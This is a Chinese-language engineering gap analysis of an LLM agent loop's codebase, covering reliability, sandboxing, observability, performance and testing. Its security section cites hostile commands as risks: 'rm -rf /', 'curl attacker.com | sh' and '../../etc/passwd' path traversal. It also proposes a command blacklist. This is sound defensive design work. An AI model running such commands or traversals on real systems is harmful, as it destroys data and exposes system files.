```yaml
Doc_Name: Base Agent-Loop 生产级差距分析
Purpose: 识别 base agent-loop 距离服务级可靠稳定的缺失功能
Type: 技术分析文档
Reader: 项目开发者
```

## 概要

对 `src/base/` 目录下的 `BaseAgentLoop` 做全面差距分析，识别其距离成为**服务级可靠稳定**的 agent-loop 所缺少的功能。按优先级分 6 个维度，每项标注影响等级和建议实现顺序。

1. 可靠性：容错与恢复
2. 安全性：沙箱与权限
3. 可观测性：日志与监控
4. 性能：并发与流式
5. 健壮性：上下文与资源管理
6. 工程规范：测试与代码质量

---

## 内容

### 1. 可靠性：容错与恢复

**目标：任何单点故障不应导致任务丢失或服务不可用。**

#### 1.1 Dog-Rider 层重试逻辑缺失 [P0]

`BaseAgentLoop._call_api` 有重试（指数退避，最多 3 次），但 `AgentLoop._call_api`（Dog-Rider 覆写）**完全移除了重试逻辑**，单次网络抖动即传播异常到调用方。连续 2 次失败就直接中止任务。

- **影响**：生产环境中瞬时网络故障、服务端过载会导致任务直接失败
- **方案**：在 `AgentLoop._call_api` 中复用 base 层的重试策略，或抽取为独立的 `RetryableHTTPClient` 供两层共用

#### 1.2 客户端限流（Rate Limiter） [P1]

当前无任何客户端限流机制。当 API 返回 429 时仅靠重试处理，没有预防性的请求速率控制。

- **影响**：高频调用场景下大量 429 响应，浪费重试配额
- **方案**：实现令牌桶或滑动窗口限流器，在 `_call_api` 前做准入控制

#### 1.3 熔断器（Circuit Breaker） [P1]

当 API 连续失败时，当前逻辑是"快速失败"——直接中止当前任务。但没有跨任务的熔断机制，下一个请求仍然会尝试调用已知不可用的服务。

- **影响**：服务端宕机期间，每个新任务都要经历 2 次失败才放弃，浪费时间和资源
- **方案**：实现三态熔断器（CLOSED → OPEN → HALF_OPEN），在 OPEN 状态下直接拒绝请求并返回友好错误

#### 1.4 优雅降级（Fallback） [P2]

API 不可用时没有任何降级策略——要么成功，要么报错。

- **影响**：完全依赖外部 LLM 服务，无离线能力
- **方案**：支持多模型 fallback 链（如 primary → secondary → local），或在 API 不可用时返回缓存的相似回答

#### 1.5 WAL 回放的幂等性 [P2]

`SessionManager.resume()` 使用 `event.timestamp <= checkpoint_time` 做 WAL 过滤。如果系统时钟发生回拨（NTP 调整、虚拟机迁移），可能导致事件丢失或重复回放。

- **影响**：时钟异常时 session 恢复后上下文不完整
- **方案**：改用单调递增的序列号（`sequence_id`）替代时间戳做 WAL 回放过滤

#### 1.6 Checkpoint 清理与过期策略 [P2]

`cache_dir` 下的 session 目录只有创建和读取，没有清理机制。长时间运行后磁盘会被旧 session 占满。

- **影响**：磁盘空间泄漏
- **方案**：增加 TTL 过期清理（如 7 天未更新的 session 自动清理），或提供 `/cleanup` 命令

---

### 2. 安全性：沙箱与权限

**目标：LLM 生成的工具调用不应能损害宿主系统。**

#### 2.1 Bash 命令沙箱 [P0 — 安全关键]

`bash_command` 直接使用 `subprocess.run(shell=True)` 执行 LLM 生成的任意命令，无任何过滤、白名单或沙箱隔离。

- **影响**：LLM 可执行 `rm -rf /`、`curl attacker.com | sh` 等危险命令
- **方案**（分层）：
  - **L1**：命令黑名单（`rm -rf`、`chmod`、`shutdown`、`curl|sh` 等）
  - **L2**：命令白名单模式（只允许 `git`、`python`、`npm` 等安全命令前缀）
  - **L3**：操作系统级沙箱（Docker 容器、nsjail、firejail）

#### 2.2 文件系统路径沙箱 [P0 — 安全关键]

`read_file`、`write_file` 操作路径为 `PROJECT_ROOT / filepath`，但未校验 `filepath` 是否包含 `..` 路径穿越。

- **影响**：LLM 可通过 `../../etc/passwd` 读取任意系统文件，或通过 `../../etc/crontab` 写入恶意内容
- **方案**：对 `filepath` 做 `resolve()` 后检查是否仍在 `PROJECT_ROOT` 内，越界则拒绝

#### 2.3 工具调用审计日志 [P1]

当前工具执行无审计记录。无法追溯 LLM 执行了哪些命令、修改了哪些文件。

- **影响**：安全事件发生后无法取证
- **方案**：每个工具调用记录 `timestamp`、`tool_name`、`args`、`result_summary`、`duration` 到独立审计日志文件

#### 2.4 API Key 安全存储 [P2]

API Key 以明文存储在 `BaseConfig` 对象和 `baseConfig.yaml` 中。

- **影响**：配置文件泄露即丢失 API Key
- **方案**：支持从环境变量（已实现）、密钥管理服务（Vault/AWS Secrets Manager）读取，配置文件中仅存储占位符

---

### 3. 可观测性：日志与监控

**目标：任何异常可在 5 分钟内定位根因。**

#### 3.1 结构化日志 [P0]

当前所有日志通过 `print()` 输出到 stdout/stderr，无日志级别、无结构化格式、无模块标识。

- **影响**：无法按级别过滤、无法被日志系统采集、无法做日志分析
- **方案**：引入 Python `logging` 模块，使用 JSON 格式输出，区分 `DEBUG/INFO/WARNING/ERROR/CRITICAL` 级别

#### 3.2 请求级链路追踪 [P1]

当前仅有 `x-session-id` header 做服务端 cache 关联。缺少 request-level 的 trace id，无法串联一次用户请求的完整调用链。

- **影响**：多轮对话中无法定位是哪一轮的哪个 API 调用出了问题
- **方案**：为每次 `run()` 生成 `trace_id`，贯穿 API 调用、工具执行、checkpoint 的所有日志

#### 3.3 延迟与耗时度量 [P1]

当前无任何耗时测量。无法知道 API 调用延迟、工具执行耗时、checkpoint 写入耗时。

- **影响**：性能问题无法定位瓶颈
- **方案**：在 `_call_api`、`tools.execute`、`checkpoint.save` 等关键路径加入计时，输出到结构化日志

#### 3.4 Token 预算预检 [P1]

`max_turns` 是唯一的循环终止条件。没有 token 预算检查——当上下文接近模型窗口上限时，API 调用会因 token 超限而失败。

- **影响**：长对话场景下突然失败，已消耗的 token 全部浪费
- **方案**：每轮调用前用 tokenizer 预估 `prompt_tokens`，超过阈值（如窗口的 90%）时触发上下文压缩或截断

#### 3.5 健康检查端点 [P2]

作为服务运行时，没有 `/health` 或 `/ready` 端点供负载均衡器或 K8s 探针使用。

- **影响**：无法做服务存活检测和自动摘除
- **方案**：提供 HTTP 端点，返回 session 数量、最近错误、API 连通性等状态

#### 3.6 指标导出（Metrics） [P2]

无 Prometheus/StatsD 等指标导出。无法在 Grafana 等面板上观察请求量、延迟分布、错误率、token 消耗趋势。

- **影响**：运维盲区
- **方案**：暴露 `/metrics` 端点，导出 counter（请求总数、错误总数、token 消耗）和 histogram（延迟分布）

---

### 4. 性能：并发与流式

**目标：用户体验和资源利用不成为瓶颈。**

#### 4.1 流式响应（Streaming） [P0]

当前使用 `urllib.request.urlopen` 同步等待完整响应。LLM 长回复场景下（如代码生成），用户需要等待数十秒才能看到任何输出。

- **影响**：用户体验极差，感知延迟高
- **方案**：实现 SSE（Server-Sent Events）流式解析，逐步输出 token。需要从 `urllib` 切换到支持流式的 HTTP 客户端

#### 4.2 异步化（Async I/O） [P1]

全部代码为同步阻塞。单进程同一时间只能处理一个请求，无法利用 I/O 等待时间。

- **影响**：服务吞吐量受限于单线程，无法并发处理多个 session
- **方案**：核心循环改为 `asyncio`，API 调用用 `aiohttp`，工具执行用 `asyncio.create_subprocess_exec`

#### 4.3 并行工具执行 [P1]

一个 API 响应中的多个 tool_call 当前是串行执行。当 LLM 同时调用 `read_file("a.py")` 和 `read_file("b.py")` 时，总耗时是两者之和。

- **影响**：多工具调用场景下不必要的延迟累积
- **方案**：检测无依赖关系的工具调用，并行执行（如多个 `read_file` 可并行，`write_file` 后跟 `read_file` 同一文件则不行）

#### 4.4 HTTP 连接池 [P2]

每次 `_call_api` 都新建 HTTP 连接，无连接复用。

- **影响**：每次请求额外支付 TCP 握手 + TLS 握手的延迟
- **方案**：使用 `urllib3` 或 `httpx` 的连接池，复用到同一 host 的连接

---

### 5. 健壮性：上下文与资源管理

**目标：不会因上下文溢出或资源泄漏导致意外中断。**

#### 5.1 上下文窗口溢出防护 [P0]

当前没有任何机制检测或防止上下文超过模型的 context window 限制。`messages` 列表可以无限增长，直到 API 返回 token limit 错误。

- **影响**：长对话/多工具调用场景下突然失败
- **方案**：
  - 每轮调用前预估 token 数
  - 超限时自动截断历史（滑动窗口、摘要压缩、或丢弃旧工具调用结果）

#### 5.2 工具输出大小限制的可配置化 [P1]

`bash_command` 4000 字符、`read_file` 8000 字符——这些截断阈值是硬编码的。不同场景（读大文件 vs 读小配置）需要不同策略。

- **影响**：截断过早丢失关键信息，截断过晚浪费 context window
- **方案**：将截断阈值移入 `BaseConfig`，支持按工具类型单独配置

#### 5.3 WAL 文件无限增长 [P1]

WAL 文件只追加不截断。长 session 的 WAL 可能增长到数百 MB。

- **影响**：磁盘空间泄漏、`resume()` 时 WAL 回放变慢
- **方案**：每次 checkpoint 成功后截断 WAL（保留 checkpoint 之后的增量），或定期做 WAL compaction

#### 5.4 文件句柄泄漏防护 [P2]

`WALWriter` 在 `__init__` 中打开文件句柄，依赖 `close()` 或 `__del__` 关闭。如果异常路径未调用 `close()`，文件句柄可能泄漏。

- **影响**：长时间运行后文件描述符耗尽
- **方案**：实现 `__enter__`/`__exit__` 上下文管理器，或在 `__del__` 中做更可靠的清理

#### 5.5 Tokenizer 优雅降级 [P2]

`DeepSeekTokenizer.__init__` 在 `tokenizer.json` 不存在时抛出 `FileNotFoundError`，直接崩溃。

- **影响**：部署环境缺少 tokenizer 文件时整个 agent 无法启动
- **方案**：缺失时 fallback 到字符数估算（`len(text) / 4`），并发出 WARNING 日志

---

### 6. 工程规范：测试与代码质量

**目标：可维护、可重构、可协作。**

#### 6.1 自动化测试套件 [P0]

当前无任何自动化测试。`scenarios.py` 是手动运行的集成验证脚本，不走 pytest，无 CI 集成。

- **影响**：任何修改都可能引入回归，且无法自动发现
- **方案**：
  - **单元测试**：`BaseContext`、`BaseToolRegistry`、`WALWriter`、`CheckpointStore`、`SerialTrigger` 各模块独立测试
  - **集成测试**：mock LLM API，验证完整 `run()` 循环的工具调用、重试、checkpoint、resume 流程
  - **CI 集成**：GitHub Actions 中添加 pytest 步骤

#### 6.2 死代码清理 [P1]

以下代码已确认为死代码：

- `discard.py` 中的 `_score_cache_contrib`、`_score_context_ratio`、`_score_output_density`、`_score_chain_depth`、`_score_role_mix` 5 维评分方法——`assess()` 不再调用
- `context.py` 中标记 `DEPRECATED` 的 `pop_natural` 方法
- `tools.py` 中带 `_` 前缀的重复函数定义（`_read_file`、`_write_file`、`_edit_file`、`_glob`、`_grep`）

- **影响**：增加认知负担、误导开发者、增加维护成本
- **方案**：删除死代码，Git 历史中仍可追溯

#### 6.3 结构化错误分类体系 [P1]

当前所有错误以字符串形式传递，没有错误码、没有错误分类。无法程序化地区分"可重试错误"和"不可重试错误"。

- **影响**：错误处理逻辑散落在各处，难以统一维护
- **方案**：定义错误枚举（如 `ErrorCode.API_TIMEOUT`、`ErrorCode.TOOL_EXECUTION_FAILED`、`ErrorCode.CONTEXT_OVERFLOW`），每个错误码关联默认处理策略（重试/中止/降级）

#### 6.4 进程管理与 Supervisor [P2]

agent 作为独立进程运行时，没有 watchdog、没有自动重启、没有 PID 文件管理。

- **影响**：进程崩溃后需要人工干预恢复
- **方案**：提供 systemd unit 文件 / Docker HEALTHCHECK / 或内置 supervisor 模式

#### 6.5 Windows 兼容性修复 [P2]

`signal.SIGTERM` 在 Windows 上不存在（已有 try/except 但语义不完整）。`shell=True` 在 Windows 上行为不同于 Unix。

- **影响**：Windows 部署时部分功能异常
- **方案**：Windows 上使用 `signal.SIGBREAK` 替代 `SIGTERM`；`bash_command` 在 Windows 上检测 shell 类型，必要时使用 PowerShell

---

## 附录

### 实现优先级总览

| 优先级 | 项目 | 维度 |
| :--- | :--- | :--- |
| **P0** | Dog-Rider 层重试逻辑 | 可靠性 |
| **P0** | Bash 命令沙箱 | 安全性 |
| **P0** | 文件系统路径沙箱 | 安全性 |
| **P0** | 结构化日志 | 可观测性 |
| **P0** | 流式响应 | 性能 |
| **P0** | 上下文窗口溢出防护 | 健壮性 |
| **P0** | 自动化测试套件 | 工程规范 |
| **P1** | 客户端限流 | 可靠性 |
| **P1** | 熔断器 | 可靠性 |
| **P1** | 工具调用审计日志 | 安全性 |
| **P1** | 请求级链路追踪 | 可观测性 |
| **P1** | 延迟与耗时度量 | 可观测性 |
| **P1** | Token 预算预检 | 可观测性 |
| **P1** | 异步化 | 性能 |
| **P1** | 并行工具执行 | 性能 |
| **P1** | 工具输出可配置化 | 健壮性 |
| **P1** | WAL 文件无限增长 | 健壮性 |
| **P1** | 死代码清理 | 工程规范 |
| **P1** | 结构化错误分类 | 工程规范 |
| **P2** | 优雅降级/Fallback | 可靠性 |
| **P2** | WAL 回放幂等性 | 可靠性 |
| **P2** | Checkpoint 过期清理 | 可靠性 |
| **P2** | API Key 安全存储 | 安全性 |
| **P2** | 健康检查端点 | 可观测性 |
| **P2** | 指标导出 | 可观测性 |
| **P2** | HTTP 连接池 | 性能 |
| **P2** | Tokenizer 优雅降级 | 健壮性 |
| **P2** | 文件句柄泄漏防护 | 健壮性 |
| **P2** | 进程管理/Supervisor | 工程规范 |
| **P2** | Windows 兼容性 | 工程规范 |

### 术语表

| 术语 | 含义 |
| :--- | :--- |
| **WAL** | Write-Ahead Log，预写日志。每条消息先写入 WAL 再处理，崩溃后可从 WAL 重建状态 |
| **Checkpoint** | 周期性完整快照。崩溃恢复时先加载 checkpoint，再回放 checkpoint 之后的 WAL |
| **熔断器** | Circuit Breaker。连续失败超过阈值后"打开"，短时间内拒绝请求，避免无意义重试 |
| **SSE** | Server-Sent Events。HTTP 流式传输协议，LLM 逐 token 返回时使用 |
| **Context Window** | 模型单次请求能处理的最大 token 数。超出即报错 |
| **令牌桶** | Token Bucket。经典限流算法，以固定速率向桶中放令牌，请求消耗令牌，桶空则拒绝 |
